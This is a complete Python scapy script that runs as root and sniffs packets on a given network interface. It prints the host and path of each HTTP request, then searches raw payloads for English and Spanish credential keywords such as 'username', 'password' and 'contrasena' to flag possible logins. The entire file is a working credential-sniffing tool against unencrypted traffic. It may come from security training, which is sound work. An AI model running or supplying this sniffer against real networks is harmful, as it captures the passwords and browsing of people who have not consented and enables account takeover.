import scapy.all as scapy
from argparse import ArgumentParser as AP
from subprocess import call
from termcolor import colored
from os import getuid
from scapy.layers import http


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"{colored('[*]','cyan')} Http Request --> {colored(url,'magenta')}")

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            searchable = ['username', 'password', 'login', 'pass', 'user', 'usuario', 'contrasena']
            
            for search in searchable:
                if search.encode() in load:
                    print(f"{colored('[*]','cyan')} Possible password found --> {colored(load,'green')}")
                    break
            


def sniff_packet(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def check_sudo():
    if getuid() != 0:
        print(
            f"{colored('[-]', 'red')} You must be super user to run this script")
        exit(1)


check_sudo()

parser = AP()

parser.add_argument('-i', '--interface', dest='interface', required=True,
                    help='select the interface that will sniff the packet')

args = parser.parse_args()

print(f"{colored('[!]', 'green')} Starting to sniff packets on {colored(args.interface, 'blue')}")
sniff_packet(args.interface)
